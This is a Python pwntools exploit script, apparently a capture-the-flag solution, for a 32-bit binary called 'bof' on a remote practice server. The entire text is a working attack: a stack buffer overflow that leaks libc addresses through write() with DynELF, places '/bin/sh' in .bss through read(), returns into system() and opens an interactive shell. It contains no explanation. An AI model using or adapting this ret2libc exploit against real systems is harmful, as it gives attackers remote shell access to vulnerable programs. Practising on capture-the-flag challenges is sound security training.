from pwn import *

elf = ELF('./bof')
#io = process('./bof')
io = remote('node4.buuoj.cn',29663)

read_addr = elf.symbols['read']
write_addr = elf.symbols['write']
main_addr = 0x804851c
bss_addr = elf.symbols['__bss_start']

def leak(addr):
	io.recvline()
	payload = 'a'*0x6c + 'b'*4 + p32(write_addr) + p32(main_addr) + p32(1) + p32(addr) + p32(0x4)
	io.sendline(payload)
	leak_addr = io.recv(4)
	return leak_addr

d = DynELF(leak,elf = elf)
system_addr = d.lookup('system','libc')
payload = 'a'*0x6c + 'b'*0x4 + p32(read_addr) + p32(main_addr) +p32(0)+p32(bss_addr)+p32(0x8)
io.sendline(payload)
io.sendline('/bin/sh')

payload = 'a'*0x6c +'b'*0x4 + p32(system_addr)+p32(main_addr)+p32(bss_addr)
io.sendline(payload)

io.interactive()

